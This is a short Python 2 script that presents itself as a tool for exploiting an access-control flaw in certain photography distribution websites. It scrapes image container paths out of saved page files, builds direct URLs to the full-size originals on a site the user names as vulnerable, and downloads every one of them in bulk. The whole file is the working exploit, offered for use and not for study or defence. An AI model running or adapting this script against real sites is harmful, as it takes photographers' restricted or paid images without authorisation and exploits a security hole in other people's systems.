#!/usr/bin/python
"""
 A script to take advantage of a basic security flaw in specific photography distribution websites that allows the
 user to download all of the files available in a given directory.

"""

from  more_itertools import unique_everseen
import urllib, re

print('\nEnter the file or files (including path) to be searched one at a time\nLeave entry blank to continue.\n\n')

# Create lists
filelist = []
matchlist = []
formattedlist = []
webdirlist = []

# Grab all user dictated files
count = 1
while True:
    n = raw_input('File %d: ' % count)
    if n == '':
        break
    filelist.append(n)
    count += 1

# Regex to find picture container names
regex = re.compile(r'/i-\w{7}/1')

# Place found strings in List
for file in filelist:
    f = open(file, 'r')
    for line in f:
        matches = regex.findall(line)
        for result in matches:
            matchlist.append(result)

# Remove duplicates
removedupe = unique_everseen(matchlist)
for entry in removedupe:
    formattedlist.append(entry)

# Transform all given input into a working URL
i = 1
name = raw_input('\nEnter the name of the picture file, it will automatically iterate '
                 'through based on number of matches.\nEx: "name" would become name-1.jpg, name-2.jpg, '
                 'etc\n\nFilename: ')
modname = '/O/' + name
address = raw_input('\nEnter the full URL of the vulnerable site:\n\nURL: ')
for webdir in formattedlist:
    iterator = '-' + str(i) + '.jpg'
    webdirlist.append(address + webdir + modname + iterator)
    i += 1

# Download files
y = 1
dwnpath = raw_input('\nEnter the directory path for the files to be downloaded to.\nEx: /Users/name/Desktop/pictures/'
                    '\n\nPath: ')
for url in webdirlist:
    iterator2 = '-' + str(y) + '.jpg'
    download = urllib.URLopener()
    download.retrieve(url, dwnpath + name + iterator2)
    print('Downloaded ' + dwnpath + name + iterator2)
    y += 1

print('All found files downloaded.')